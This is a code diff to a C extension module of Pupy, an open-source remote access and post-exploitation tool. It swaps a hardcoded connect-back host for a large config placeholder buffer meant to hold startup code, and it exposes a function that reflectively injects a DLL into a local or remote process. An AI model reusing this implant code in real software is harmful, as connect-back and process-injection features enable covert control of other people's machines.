@@ -1,6 +1,6 @@
 /*
-  For the pupy_builtins compiled into pupy exe and reflective DLL stubs we need "Python-dynload.h".
-  For the standalone .pyd we need <Python.h>
+# Copyright (c) 2015, Nicolas VERDIER (contact@n1nj4.eu)
+# Pupy is under the BSD 3-Clause license. see the LICENSE file at the root of the project for the detailed licence terms
 */
 
 #include "Python-dynload.h"
@@ -11,11 +11,7 @@ static char module_doc[] = "Builtins utilities for pupy";
 
 extern const char resources_library_compressed_string_txt_start[];
 extern const int resources_library_compressed_string_txt_size;
-#ifndef STANDALONE
-extern char connect_back_host[100];
-#else
-char connect_back_host[100] = "0.0.0.0:443";
-#endif
+char pupy_config[4096]="####---PUPY_CONFIG_COMES_HERE---####\n"; //big array to have space for more config / code run at startup
 extern const DWORD dwPupyArch;
 static PyObject *Py_get_compressed_library_string(PyObject *self, PyObject *args)
 {
@@ -23,10 +19,11 @@ static PyObject *Py_get_compressed_library_string(PyObject *self, PyObject *args
 }
 
 static PyObject *
-Py_get_connect_back_host(PyObject *self, PyObject *args)
+Py_get_pupy_config(PyObject *self, PyObject *args)
 {
-	return Py_BuildValue("s", connect_back_host);
+	return Py_BuildValue("s", pupy_config);
 }
+
 static PyObject *Py_get_arch(PyObject *self, PyObject *args)
 {
 	if(dwPupyArch==PROCESS_ARCH_X86){
@@ -73,7 +70,7 @@ static PyObject *Py_load_dll(PyObject *self, PyObject *args)
 }
 
 static PyMethodDef methods[] = {
-	{ "get_connect_back_host", Py_get_connect_back_host, METH_NOARGS, "get_connect_back_host() -> (ip, port)" },
+	{ "get_pupy_config", Py_get_pupy_config, METH_NOARGS, "get_pupy_config() -> string" },
 	{ "get_arch", Py_get_arch, METH_NOARGS, "get current pupy architecture (x86 or x64)" },
 	{ "_get_compressed_library_string", Py_get_compressed_library_string, METH_VARARGS },
 	{ "reflective_inject_dll", Py_reflective_inject_dll, METH_VARARGS|METH_KEYWORDS, "reflective_inject_dll(pid, dll_buffer, isRemoteProcess64bits)\nreflectively inject a dll into a process. raise an Exception on failure" },
